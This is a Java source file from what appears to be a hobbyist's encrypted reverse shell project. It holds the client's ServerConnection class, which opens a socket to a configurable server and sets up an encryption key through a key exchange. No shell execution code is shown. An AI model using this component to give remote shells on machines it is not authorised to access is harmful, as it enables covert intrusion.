package obs1d1anc1ph3r.reverseshell.client.connection;

import java.io.*;
import java.net.*;
import java.util.logging.Level;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.client.encryption.KeyExchangeHandler;
import obs1d1anc1ph3r.reverseshell.client.utils.StreamHandler;

public class ServerConnection {

	private final String serverIp;
	private final int serverPort;
	private Socket socket;
	private StreamHandler streamHandler;
	private static final Logger logger = Logger.getLogger(ServerConnection.class.getName());
	private byte[] encryptionKey;

	//Refactoring it now
	//This is sooooo much better, probably still needs more work at some point tho
	public ServerConnection(String serverIp, int serverPort) {
		this.serverIp = serverIp;
		this.serverPort = serverPort;

	}

	public synchronized void connect() throws IOException {
		try {
			System.out.println("[-] Connecting to server...");
			socket = new Socket();
			socket.connect(new InetSocketAddress(serverIp, serverPort), 5000); //I think this is a timeout thing, I forgot tbh
			System.out.println("[-*] Connected to server: " + serverIp + ":" + serverPort);

			streamHandler = new StreamHandler(socket);

			KeyExchangeHandler keyExchange = new KeyExchangeHandler(streamHandler);
			keyExchange.sendPublicKey();

			encryptionKey = keyExchange.performKeyExchange();
			setStreamHandlerEncryptionKey();
			System.out.println("[-*] Encryption key established.");

		} catch (UnknownHostException e) {
			logger.log(Level.SEVERE, "Unknown host: {0}", e.getMessage());
			cleanup();
			throw new IOException("Unknown host: " + e.getMessage(), e);
		} catch (IOException e) {
			logger.log(Level.SEVERE, "IO error occurred while connecting: {0}", e.getMessage());
			cleanup();
			throw e;
		}
	}

	public StreamHandler getStreamHandler() {
		return streamHandler;
	}

	public void setStreamHandlerEncryptionKey() {
		streamHandler.setEncryptionKey(encryptionKey);
	}

	public Socket getSocket() {
		return socket;
	}

	//I think this works, if it doesn't, then if it stops with errors, it's still stopped, so win win, I guess
	//I have stopped it stopping with errors, for now, again, will probably have to fix again in the future
	public synchronized void cleanup() {
		try {
			if (streamHandler != null) {
				streamHandler.close();
			}
			if (socket != null) {
				socket.close();
			}
			System.out.println("[*] Resources cleaned up successfully.");
		} catch (IOException e) {
			logger.log(Level.SEVERE, "Error closing resources: {0}", e.getMessage());
		}
	}
}
